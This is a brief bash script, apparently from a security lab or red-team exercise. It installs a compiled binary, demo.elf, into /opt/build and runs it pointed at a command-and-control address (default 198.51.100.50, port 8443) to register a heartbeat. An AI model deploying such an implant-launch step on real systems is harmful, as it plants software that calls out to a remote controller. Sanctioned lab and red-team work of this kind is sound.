#!/usr/bin/env bash
# ops（窗口内）：部署编译产物并向批准端点注册心跳。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
install -m 0755 demo.elf /opt/build/demo.elf
/opt/build/demo.elf "$C2_IP" 8443
